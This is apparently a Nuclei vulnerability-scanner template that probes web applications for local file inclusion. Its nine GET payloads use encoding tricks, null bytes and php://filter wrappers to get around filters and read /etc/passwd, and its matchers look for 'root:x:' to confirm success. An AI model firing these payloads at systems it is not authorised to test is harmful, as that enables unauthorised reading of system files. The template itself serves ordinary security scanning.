id: m7-lfi-encoded-bypass
info:
  name: M7 - LFI Encoding Bypass Techniques
  author: Sharlix
  severity: critical
  description: LFI with URL encoding, double encoding, and null byte bypass
  tags: lfi,bypass,encoding,m7hunter

requests:
  - method: GET
    path:
      - "{{BaseURL}}?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd"
      - "{{BaseURL}}?file=....//....//etc/passwd"
      - "{{BaseURL}}?file=..%252F..%252F..%252Fetc%252Fpasswd"
      - "{{BaseURL}}?file=%2F..%2F..%2F..%2Fetc%2Fpasswd"
      - "{{BaseURL}}?file=..%c0%af..%c0%afetc%c0%afpasswd"
      - "{{BaseURL}}?file=/etc/passwd%00.jpg"
      - "{{BaseURL}}?file=/etc/passwd%00"
      - "{{BaseURL}}?file=php://filter/convert.base64-encode/resource=../../../../etc/passwd"
      - "{{BaseURL}}?file=php://filter/read=string.rot13/resource=../../../../etc/passwd"

    matchers-condition: or
    matchers:
      - type: regex
        regex:
          - "root:x?:\d+:\d+:"
        part: body

      - type: dsl
        dsl:
          - "contains(base64_decode(body), 'root:x:')"
